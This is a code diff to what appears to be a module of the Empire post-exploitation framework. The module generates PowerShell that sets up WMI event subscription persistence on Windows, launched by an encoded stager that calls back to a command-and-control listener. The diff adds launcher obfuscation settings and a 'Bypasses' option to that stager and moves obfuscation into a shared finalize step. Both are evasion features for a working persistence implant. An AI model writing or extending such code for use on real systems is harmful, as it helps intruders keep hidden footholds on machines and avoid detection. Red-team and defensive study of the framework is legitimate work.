@@ -15,7 +15,6 @@ from empire.server.utils.module_util import handle_error_message
 class Module(object):
     @staticmethod
     def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
-        listener_name = params['Listener']
 
         # trigger options
         daily_time = params['DailyTime']
@@ -31,9 +30,15 @@ class Module(object):
         cleanup = params['Cleanup']
 
         # staging options
+        listener_name = params['Listener']
         user_agent = params['UserAgent']
         proxy = params['Proxy']
         proxy_creds = params['ProxyCreds']
+        if (params['Obfuscate']).lower() == 'true':
+            launcher_obfuscate = True
+        else:
+            launcher_obfuscate = False
+        launcher_obfuscate_command = params['ObfuscateCommand']
 
         status_msg = ""
         location_string = ""
@@ -48,8 +53,8 @@ class Module(object):
             script += "Get-WmiObject __FilterToConsumerBinding -Namespace root\\subscription | Where-Object { $_.filter -match '" + dummy_sub_name + "'} | Remove-WmiObject;"
             script += "'WMI persistence with subscription named " + sub_name + " removed.'"
             script = data_util.keyword_obfuscation(script)
-            if obfuscate:
-                script = helpers.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=obfuscation_command)
+
+            script = main_menu.modules.finalize_module(script=script, script_end='', obfuscate=obfuscate, obfuscation_command=obfuscation_command)
             return script
 
         if ext_file != '':
@@ -78,9 +83,15 @@ class Module(object):
 
             else:
                 # generate the PowerShell one-liner with all of the proper options set
-                launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True,
-                                                                   userAgent=user_agent, proxy=proxy,
-                                                                   proxyCreds=proxy_creds)
+                launcher = main_menu.stagers.generate_launcher(listenerName=listener_name,
+                                                               language='powershell',
+                                                               encode=True,
+                                                               obfuscate=launcher_obfuscate,
+                                                               obfuscationCommand=launcher_obfuscate_command,
+                                                               userAgent=user_agent,
+                                                               proxy=proxy,
+                                                               proxyCreds=proxy_creds,
+                                                               bypasses=params['Bypasses'])
 
                 enc_script = launcher.split(" ")[-1]
                 status_msg += "using listener " + listener_name
@@ -157,8 +168,5 @@ class Module(object):
 
         script += "'WMI persistence established " + status_msg + "'"
 
-        if main_menu.obfuscate:
-            script = data_util.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=main_menu.obfuscateCommand)
-        script = data_util.keyword_obfuscation(script)
-
+        script = main_menu.modules.finalize_module(script=script, script_end='', obfuscate=obfuscate, obfuscation_command=obfuscation_command)
         return script
